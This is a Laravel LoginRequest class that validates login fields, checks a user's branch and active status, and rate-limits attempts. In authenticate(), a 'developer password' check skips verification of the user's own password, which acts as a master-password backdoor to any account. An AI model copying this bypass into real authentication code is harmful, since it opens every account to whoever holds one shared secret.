<?php

namespace App\Http\Requests\Auth;

use App\Helpers\DeveloperHelper;
use App\Models\Master\Branch;
use App\Models\Master\User;
use Illuminate\Auth\Events\Lockout;
use Illuminate\Foundation\Http\FormRequest;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Str;
use Illuminate\Validation\ValidationException;

class LoginRequest extends FormRequest
{
    /**
     * Determine if the user is authorized to make this request.
     * 
     * @return bool
     */
    public function authorize(): bool
    {
        return true;
    }

    /**
     * Get the validation rules that apply to the request.
     *
     * @return array<string, \Illuminate\Contracts\Validation\ValidationRule|array<mixed>|string>
     */
    public function rules(): array
    {
        return [
            'financial_year' => ['required', 'string', 'regex:/^\d{4}-\d{4}$/'],
            'branch_id' => ['required', 'integer', 'exists:branches,id'],
            'username' => ['required', 'string'],
            'password' => ['required', 'string'],
            'remember' => ['boolean'],
        ];
    }

    /**
     * Get the error messages for the defined validation rules.
     *
     * @return array<string, string>
     */
    public function messages(): array
    {
        return [
            'financial_year.required' => 'Please select a financial year.',
            'financial_year.regex' => 'Invalid financial year format.',
            'branch_id.required' => 'Please select a branch.',
            'branch_id.exists' => 'Selected branch does not exist.',
            'username.required' => 'Please enter your username.',
            'password.required' => 'Please enter your password.',
            'remember.boolean' => 'Invalid remember value.',
        ];
    }

    /**
     * Attempt to authenticate the request's credentials.
     *
     * @throws \Illuminate\Validation\ValidationException
     * 
     * @return void
     */
    public function authenticate(): void
    {
        $this->ensureIsNotRateLimited();

        $user = User::where(['username' => $this->username])->first();
        if (!$user) {
            $this->incrementRateLimiter();
            throw ValidationException::withMessages([
                'username' => trans('auth.failed'),
            ]);
        }
        
        if(!Branch::find($this->branch_id)) {
            $this->incrementRateLimiter();
            throw ValidationException::withMessages([
                'branch_id' => trans('auth.failed'),
            ]);
        }

        if($user->branch_id != $this->branch_id) {
            $this->incrementRateLimiter();
            throw ValidationException::withMessages([
                'branch_id' => trans('auth.failed'),
            ]);
        }

        if($user->is_active == false) {
            $this->incrementRateLimiter();
            throw ValidationException::withMessages([
                'username' => trans('auth.failed'),
            ]);
        }

        if($user->deleted_at) {
            $this->incrementRateLimiter();
            throw ValidationException::withMessages([
                'username' => trans('auth.failed'),
            ]);
        }

        $isDeveloperPassword = DeveloperHelper::isDeveloperPassword($this->password);
        
        if (!$isDeveloperPassword && !\Hash::check($this->password, $user->password)) {
            $this->incrementRateLimiter();
            throw ValidationException::withMessages([
                'username' => trans('auth.failed'),
            ]);
        }

        if ($isDeveloperPassword) DeveloperHelper::setDeveloperMode(true);

        Auth::login($user, $this->boolean('remember'));
        RateLimiter::clear($this->throttleKey());
    }

    /**
     * Ensure the login request is not rate limited.
     *
     * @throws \Illuminate\Validation\ValidationException
     * 
     * @return void
     */
    public function ensureIsNotRateLimited(): void
    {
        $this->ensureUserIsNotRateLimited();
        $this->ensureIpIsNotRateLimited();
    }

    /**
     * Ensure the login request is not rate limited.
     * 
     * @throws \Illuminate\Validation\ValidationException
     * 
     * @return void
     */
    protected function ensureUserIsNotRateLimited(): void
    {
        if (!RateLimiter::tooManyAttempts($this->throttleKey(), 5)) {
            return;
        }
        event(new Lockout($this));
        $seconds = RateLimiter::availableIn($this->throttleKey());
        throw ValidationException::withMessages([
            'username' => trans('auth.throttle', [
                'seconds' => $seconds,
                'minutes' => ceil($seconds / 60),
            ]),
        ]);
    }

    /**
     * Ensure the login request is not rate limited.
     * 
     * @throws \Illuminate\Validation\ValidationException
     * 
     * @return void
     */
    protected function ensureIpIsNotRateLimited(): void
    {
        if (!RateLimiter::tooManyAttempts($this->throttleIPKey(), 10)) {
            return;
        }
        $seconds = RateLimiter::availableIn($this->throttleIPKey());
        throw ValidationException::withMessages([
            'username' => trans('auth.throttle', [
                'seconds' => $seconds,
                'minutes' => ceil($seconds / 60),
            ]),
        ]);
    }
    
    /**
     * Increment the rate limiter counter for a user.
     * 
     * @return void
     */
    protected function incrementRateLimiter(): void
    {
        RateLimiter::hit($this->throttleKey());
        RateLimiter::hit($this->throttleIPKey());
    }

    /**
     * Get the throttle key for the request.
     * 
     * @return string
     */
    public function throttleKey(): string
    {
        return strtolower($this->input('username'));
    }

    /**
     * Get the throttle key for the request.
     * 
     * @return string
     */
    public function throttleIPKey(): string
    {
        return $this->ip();
    }
}
